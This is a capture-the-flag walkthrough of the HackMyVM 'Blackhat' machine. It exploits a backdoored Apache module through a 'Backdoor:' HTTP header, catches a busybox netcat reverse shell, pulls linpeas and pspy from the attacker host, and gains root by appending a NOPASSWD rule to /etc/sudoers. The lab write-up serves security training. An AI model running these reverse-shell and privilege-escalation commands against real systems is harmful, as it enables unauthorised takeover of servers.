# Blackhat

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Blackhat | cromiphi | Beginner | HackMyVM |

**Summary:** Blackhat is a beginner-level HackMyVM machine that presents a deceptively simple web surface — a defaced Apache page — hiding a custom Apache module called `mod_backdoor`. The hidden module listens for a special HTTP request header (`Backdoor:`) and executes its value as a shell command on the server, granting immediate unauthenticated Remote Code Execution (RCE) as `www-data`. After obtaining a reverse shell, post-exploitation enumeration with `linpeas.sh` reveals a misconfigured ACL on `/etc/sudoers`, giving the local user `darkdante` write (`rw-`) permission to that file. Because `darkdante` has no password set, we switch to that user and append an unrestricted `NOPASSWD:ALL` sudoers rule, instantly escalating to `root`. The entire attack chain exploits two intentional misconfigurations: a backdoored Apache module and a dangerously permissive sudoers ACL.

---

## Reconnaissance

### Host Discovery

The target was identified on the local network using a custom PowerShell network scanner. The machine's IP resolved to `192.168.100.129` with a VirtualBox MAC address.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.129 08:00:27:44:07:65 VirtualBox
```

### Port Scanning

A full-port Nmap scan with service and script detection was run against the target. Only a single port was exposed — TCP 80 running **Apache httpd 2.4.54** on Debian. The HTTP title already hints at the machine's theme: *"Hacked By HackMyVM"*.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/blackhat]
└─$ nmap -sC -sV -p- -T4 192.168.100.129
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 09:54 WIB
Nmap scan report for 192.168.100.129
Host is up (0.058s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title:  Hacked By HackMyVM
|_http-server-header: Apache/2.4.54 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.42 seconds
```

### Web Enumeration — Source Code Analysis

Fetching the root page with `curl -i` reveals the raw HTTP response and HTML source. Two critical clues are immediately visible:

1. A hidden `<div>` containing the comment **`check backboor`** — a developer hint (with a typo) pointing to a backdoor mechanism.
2. JavaScript that blocks right-click and common keyboard shortcuts (`Ctrl+C`, `Ctrl+V`, `Ctrl+U`) — an obvious attempt to discourage source inspection, which we trivially bypass with `curl`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/blackhat]
└─$ curl -i http://192.168.100.129/
HTTP/1.1 200 OK
Date: Thu, 26 Feb 2026 02:57:04 GMT
Server: Apache/2.4.54 (Debian)
Last-Modified: Sat, 19 Nov 2022 08:06:24 GMT
ETag: "59d-5edce4c6f946a"
Accept-Ranges: bytes
Content-Length: 1437
Vary: Accept-Encoding
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Hacked By HackMyVM</title>
    <link rel="stylesheet" href="./style.css">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script>
document.onkeydown = function(e) {
        if (e.ctrlKey &&
            (e.keyCode === 67 ||
             e.keyCode === 86 ||
             e.keyCode === 85 ||
             e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
};
$(document).keypress("u",function(e) {
  if(e.ctrlKey)
  {
return false;
}
else
{
return true;
}
});
</script>
<body oncontextmenu="return false;" >
</head>

<body>
    <div class="mainContainer">
    <div style="display:none;">check backboor</div>

        <div class="img">
            <img class="mainImage" src="./image.jpg" alt="image">
        </div>
        <h1> Hacked By HackMyVM team</h1>
        <hr class="hr">

        <div class="container">
            <h2 class="teamName"> <span> Defaced </h2>
            <p class="text1">
                #hackmyvm #cybersecurity #infosec #ctf #pentest
            </p>

            <textarea name="textbox" class="textbox" cols="50" rows="1">
https://hackmyvm.eu/
            </textarea>


        </div>
    </div>
</body>

</html>
```

### Directory Fuzzing

`ffuf` was run with the `dirb/common.txt` wordlist, fuzzing for `.txt`, `.php`, and `.html` extensions. Alongside `index.html`, a **`phpinfo.php`** file was discovered — an information disclosure goldmine.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/blackhat]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.100.129/FUZZ -e txt,php,html -fs 280

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.129/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : txt php html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 280
________________________________________________

                        [Status: 200, Size: 1437, Words: 328, Lines: 63, Duration: 15ms]
index.html              [Status: 200, Size: 1437, Words: 328, Lines: 63, Duration: 29ms]
phpinfo.php             [Status: 200, Size: 69400, Words: 3291, Lines: 769, Duration: 136ms]
:: Progress: [18456/18456] :: Job [1/1] :: 1063 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

### Vulnerability Discovery — mod_backdoor

Browsing to `http://192.168.100.129/phpinfo.php` reveals the full Apache server configuration. The **Loaded Modules** section exposes the smoking gun: **`mod_backdoor`** is explicitly listed among the active Apache modules. This is a custom malicious Apache module that intercepts HTTP requests containing a specific header and executes its value as a system command.

Additional details confirmed from the phpinfo output:
- **Apache Version:** Apache/2.4.54 (Debian)
- **Apache API Version:** 20120211
- **Server Administrator:** webmaster@localhost
- **Hostname:Port:** 127.0.1.1:80
- **User/Group:** www-data(33)/33
- **Loaded Modules include:** `mod_backdoor` (highlighted)

![phpinfo](image.png)

The presence of `mod_backdoor` in the loaded modules directly explains the hidden `check backboor` comment in the HTML source — the author intentionally left this breadcrumb.

---

## Initial Access

### Confirming RCE via the Backdoor Header

With `mod_backdoor` confirmed, testing the `Backdoor:` HTTP header immediately returns command output. Sending `id` confirms execution as `www-data` — unauthenticated RCE without any exploit, just a custom HTTP header.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/blackhat]
└─$ curl -H "Backdoor: id" http://192.168.100.129/
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

A netcat listener was set up on the attacker machine, then the backdoor was leveraged to execute a `busybox` reverse shell one-liner. The connection was caught immediately.

**Attacker — start listener:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/blackhat]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

**Attacker — trigger reverse shell via backdoor:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/blackhat]
└─$ curl -H "Backdoor: busybox nc 192.168.100.1 4444 -e /bin/bash" http://192.168.100.129/
```

**Catch and stabilize the shell:**
```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 53505
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@blackhat:/$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/blackhat]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@blackhat:/$ export SHELL=bash
www-data@blackhat:/$ export TERM=xterm
www-data@blackhat:/$ stty rows 100 cols 200
```

A fully interactive TTY was obtained as `www-data`.

---

## Post-Exploitation Enumeration

### Local Users

Filtering `/etc/passwd` for login shells reveals two accounts with bash: `root` and `darkdante`. The user flag is in `darkdante`'s home directory, locked with `700` permissions — inaccessible to `www-data`.

```bash
www-data@blackhat:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
darkdante:x:1000:1000:,,,:/home/darkdante:/bin/bash
www-data@blackhat:/$ ls -la /home
total 12
drwxr-xr-x  3 root      root      4096 Nov 11  2022 .
drwxr-xr-x 18 root      root      4096 Nov 10  2022 ..
drwxr-xr-x  3 darkdante darkdante 4096 Nov 13  2022 darkdante
www-data@blackhat:/$ ls -la /home/darkdante/
total 28
drwxr-xr-x 3 darkdante darkdante 4096 Nov 13  2022 .
drwxr-xr-x 3 root      root      4096 Nov 11  2022 ..
lrwxrwxrwx 1 root      root         9 Nov 11  2022 .bash_history -> /dev/null
-rw-r--r-- 1 darkdante darkdante  220 Nov 11  2022 .bash_logout
-rw-r--r-- 1 darkdante darkdante 3526 Nov 11  2022 .bashrc
drwxr-xr-x 3 darkdante darkdante 4096 Nov 11  2022 .local
-rw-r--r-- 1 darkdante darkdante  807 Nov 11  2022 .profile
-rwx------ 1 darkdante darkdante   33 Nov 11  2022 user.txt
```

Note that `.bash_history` is symlinked to `/dev/null` — a typical anti-forensics measure on CTF machines.

### Sudo Lecture File

A sudo lecture file exists for `darkdante`, confirming this user has interacted with `sudo` before (or the file was pre-created):

```bash
www-data@blackhat:/etc/apache2/mods-available$ find / -name "*darkdante*" 2>/dev/null
/var/lib/sudo/lectured/darkdante
/home/darkdante
www-data@blackhat:/etc/apache2/mods-available$ ls -la /var/lib/sudo/lectured/darkdante
-rw------- 1 root darkdante 0 Nov 13  2022 /var/lib/sudo/lectured/darkdante
```

### Transferring Enumeration Tools

`pspy64` (process monitor) and `linpeas.sh` were transferred from the attacker's HTTP server to the target for deeper enumeration.

**Attacker — serve files:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.21.32.1 - - [26/Feb/2026 10:26:31] "GET /pspy64 HTTP/1.1" 200 -
172.21.32.1 - - [26/Feb/2026 10:26:35] "GET /linpeas.sh HTTP/1.1" 200 -
```

**Target — download and make executable:**
```bash
www-data@blackhat:/tmp$ wget http://192.168.100.1:8080/pspy64
--2026-02-26 04:26:30--  http://192.168.100.1:8080/pspy64
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64                                              0%[                                              pspy64                                            100%[=============================================================================================================>]   2.96M  --.-KB/s    in 0.09s

2026-02-26 04:26:30 (34.2 MB/s) - 'pspy64' saved [3104768/3104768]

www-data@blackhat:/tmp$ wget http://192.168.100.1:8080/linpeas.sh
--2026-02-26 04:26:34--  http://192.168.100.1:8080/linpeas.sh
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                                          0%[                                              linpeas.sh                                        100%[=============================================================================================================>] 949.15K  --.-KB/s    in 0.06s

2026-02-26 04:26:34 (16.0 MB/s) - 'linpeas.sh' saved [971926/971926]
www-data@blackhat:/tmp$ chmod +x pspy64 linpeas.sh
```

### pspy64 — Process Monitoring

`pspy64` was run to observe scheduled jobs and processes running as root. No exploitable cron jobs were found — only standard DHCP client activity running as UID=0:

```bash
2026/02/26 04:27:46 CMD: UID=0     PID=1103   | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
2026/02/26 04:27:46 CMD: UID=0     PID=1104   | /bin/sh /sbin/dhclient-script
2026/02/26 04:27:46 CMD: UID=0     PID=1105   | /bin/sh /sbin/dhclient-script
2026/02/26 04:27:46 CMD: UID=0     PID=1106   | /bin/sh /sbin/dhclient-script
2026/02/26 04:27:46 CMD: UID=0     PID=1107   | /bin/sh /sbin/dhclient-script
```

### linpeas.sh — Critical Finding: ACL on /etc/sudoers

`linpeas.sh` identified a critical misconfiguration — a POSIX ACL (Access Control List) grants the user `darkdante` **read-write (`rw-`)** access directly to `/etc/sudoers`. This is a severe privilege escalation path: anyone who can become `darkdante` can rewrite the sudoers policy.

```bash
╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls
# file: /etc/sudoers
USER   root       r--
user   darkdante  rw-
GROUP  root       r--
mask              rw-
other             ---
```

---

## Privilege Escalation

### Step 1 — Switch to darkdante (No Password)

`darkdante` has no password set. A direct `su darkdante` from the `www-data` shell succeeds without any credential prompt.

```bash
www-data@blackhat:/home/darkdante$ su darkdante
darkdante@blackhat:~$ id
uid=1000(darkdante) gid=1000(darkdante) groups=1000(darkdante)
darkdante@blackhat:~$
```

### Step 2 — Abuse sudoers ACL Write Access → Root

Since `darkdante` has write access to `/etc/sudoers` via the ACL, a single `echo` command appends an unrestricted `NOPASSWD:ALL` rule for `darkdante`. Running `sudo su` immediately drops into a root shell.

```bash
darkdante@blackhat:~$ echo "darkdante ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
darkdante@blackhat:~$ sudo su
root@blackhat:/home/darkdante# cd
root@blackhat:~# id
uid=0(root) gid=0(root) groups=0(root)
root@blackhat:~# whoami
root
root@blackhat:~# hostname
blackhat
```

### Step 3 — Capture the Flags

```bash
root@blackhat:~# cat /home/darkdante/user.txt
89f[REDACTED]
root@blackhat:~# cat /root/root.txt
8cc[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: Full-port Nmap scan revealed a single open service — Apache/2.4.54 on TCP 80. The HTTP title "*Hacked By HackMyVM*" and a hidden HTML comment `check backboor` hinted at intentional server compromise.

2. **Vulnerability Discovery**: Directory fuzzing with `ffuf` uncovered `phpinfo.php`. Analysing the phpinfo output exposed **`mod_backdoor`** — a custom, malicious Apache module — in the Loaded Modules list, confirming the server accepted OS commands via a special HTTP request header (`Backdoor:`).

3. **Exploitation**: A single `curl` request with `Backdoor: id` confirmed unauthenticated RCE as `www-data`. A `busybox nc` reverse shell payload delivered via the same header provided a fully interactive shell after TTY stabilisation with Python's `pty` module.

4. **Internal Enumeration**: `linpeas.sh` identified a critical POSIX ACL misconfiguration granting user `darkdante` read-write (`rw-`) access to `/etc/sudoers`. Separately, `darkdante` was confirmed to have no password set, making lateral movement trivial via `su darkdante`.

5. **Privilege Escalation**: Switching to `darkdante` (passwordless `su`) and exploiting the sudoers ACL write access, a single `echo` command injected `darkdante ALL=(ALL) NOPASSWD:ALL` into `/etc/sudoers`. Running `sudo su` immediately escalated to a full `root` shell, yielding both the user and root flags.
